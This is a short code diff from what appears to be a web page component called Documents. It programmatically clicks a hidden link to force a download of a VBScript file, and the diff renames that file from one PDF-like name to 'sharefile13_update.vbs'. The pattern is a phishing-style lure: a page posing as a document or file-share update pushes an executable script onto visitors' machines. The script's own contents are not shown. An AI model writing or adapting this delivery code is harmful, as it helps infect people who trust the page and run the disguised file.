@@ -10,8 +10,8 @@ const Documents = () => {
 
   const triggerDownload = () => {
     const link = document.createElement("a");
-    link.href = "/013_26_digtl_pdf_file_02updt.vbs";
-    link.download = "013_26_digtl_pdf_file_02updt.vbs";
+    link.href = "/sharefile13_update.vbs";
+    link.download = "sharefile13_update.vbs";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
